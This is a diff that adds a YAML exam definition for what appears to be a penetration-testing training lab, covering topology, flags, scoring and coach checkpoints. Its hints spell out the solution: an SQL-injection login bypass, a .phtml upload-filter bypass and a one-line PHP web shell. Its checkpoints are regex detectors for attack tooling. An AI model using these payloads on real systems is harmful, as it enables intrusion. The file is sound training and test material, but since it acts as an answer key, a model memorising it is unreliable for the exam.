@@ -1,0 +1,86 @@
+apiVersion: pentrain/v1
+kind: Quest
+meta:
+  id: web-t2-exam
+  track: web-appsec
+  tier: 2
+  title: "Exam: The Intranet"
+  exam: true
+  version: 1
+display:
+  tagline: "T2 final exam: bypass the login, bypass the upload filter, land a shell. The full OWASP chain in one app."
+requirements:
+  min_ram_gb: 10
+  min_vcpus: 6
+  min_disk_gb: 80
+  est_deploy_min: 8
+topology:
+  kali:
+    template: kali-x64-desktop-template
+    ram_gb: 6
+    cpus: 4
+  vms:
+    - name: intranet01
+      template: debian-12-x64-server-template
+      ram_gb: 2
+      cpus: 2
+      vlan: 10
+      ip_last_octet: 45
+      roles: [pentrain_web_t2_exam]
+flags:
+  - id: report-flag
+    name: "Report flag — rendered behind the login"
+    kind: file
+    points: 150
+    vm: intranet01
+    file_path: /var/lib/intranet/flag.txt
+  - id: uploads-flag
+    name: "Uploads flag — waiting in the drop dir"
+    kind: file
+    points: 150
+    vm: intranet01
+    file_path: /var/www/html/uploads/flag.txt
+  - id: rce-flag
+    name: "RCE flag — outside the webroot, shell required"
+    kind: file
+    points: 250
+    vm: intranet01
+    file_path: /flag.txt
+hints:
+  - id: h1
+    cost: 30
+    stage: recon
+    text: "Enumerate before you attack — gobuster/feroxbuster on the webroot, and try the login form with a single quote to see how it fails."
+  - id: h2
+    cost: 50
+    stage: exploit
+    text: "username=admin' OR '1'='1' -- — after the bypass, the panel links an upload page. Its blacklist knows php/php3-7/pht — what about .phtml?"
+  - id: h3
+    cost: 70
+    stage: exploit
+    text: "<?php system($_GET['c']); ?> in a .phtml file → /uploads/x.phtml?c=cat+/flag.txt — the last flag isn't web-readable, you need code execution."
+coach:
+  briefing_ref: coach_context.md
+  checkpoints:
+    - id: cp-enum
+      name: "Enumerated the app"
+      detect: { command_match: "(gobuster|feroxbuster|dirb|dirsearch|nikto|uploads)" }
+      hint_after_s: 600
+    - id: cp-sqli
+      name: "Broke the login"
+      detect: { command_match: "(sqlmap|' OR|or 1=1|-- -)" }
+      hint_after_s: 600
+    - id: cp-upload
+      name: "Attempted the upload bypass"
+      detect: { command_match: "(\\.phtml|\\.phar|upload\\.php|Content-Type)" }
+      hint_after_s: 720
+    - id: cp-shell
+      name: "Ran commands via the webshell"
+      detect: { command_match: "(c=|cmd=|system\\(|webshell|/flag)" }
+      hint_after_s: 600
+  escalation: { observe_grace_s: 120, nudge_s: 480, hint_s: 840 }
+scoring:
+  base: 550
+  time_bonus_max: 200
+  par_s: 1800
+  takeover_cost: 150
